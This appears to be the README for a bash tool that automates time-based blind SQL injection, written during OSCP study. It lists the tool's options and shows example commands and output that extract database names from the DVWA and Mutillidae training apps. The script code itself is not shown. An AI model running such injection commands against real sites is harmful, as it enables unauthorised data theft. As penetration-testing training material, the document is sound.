# Time-based Blind SQL Injection

Bash script for automating time-based blind SQL injections.

## About

This script was written while pursuing the OSCP. It can be used to exploit vulnerable string parameters in GET or POST requests. While the script is based on MySQL, it can be adapted to work against other DBMSs by modifying the `$payload` value.

## Disclaimer

This script is intended for educational purposes/authorised testing only. The author of this script does not take responsibility for the unauthorised use of this script.

## Usage

```
$ ./time_blind_sqli.sh -h
usage: ./time_blind_sqli.sh [-h] -u url [-d data] -p parameter [-c cookie] -s sql -t time_delay

Options:
-h    Print this help
-u    URL
-d    POST data
-p    Vulnerable parameter
-c    Cookie
-s    SQL query to be executed on target
-t    Time delay duration in seconds (try higher value if you get inaccurate results)
```

## Examples

Exploiting time-based SQL injection in id GET parameter:

```
$ ./time_blind_sqli.sh -u "http://192.168.56.101/vulnerabilities/sqli_blind/?id=PAYLOAD&Submit=Submit" -p id -c "PHPSESSID=sv43imms0ubmpig14pi715h9a7; security=low" -s "SELECT database()" -t 2
Retrieving query results one character at a time...
dvwa
Finished!
```

Exploiting time-based SQL injection in username POST parameter:

```
$ ./time_blind_sqli.sh -u "http://nowasp.local/mutillidae/index.php?page=login.php" -d "username=PAYLOAD&password=pass&login-php-submit-button=Login" -p username -s "SELECT database()" -t 2
Retrieving query results one character at a time...
nowasp
Finished!
```
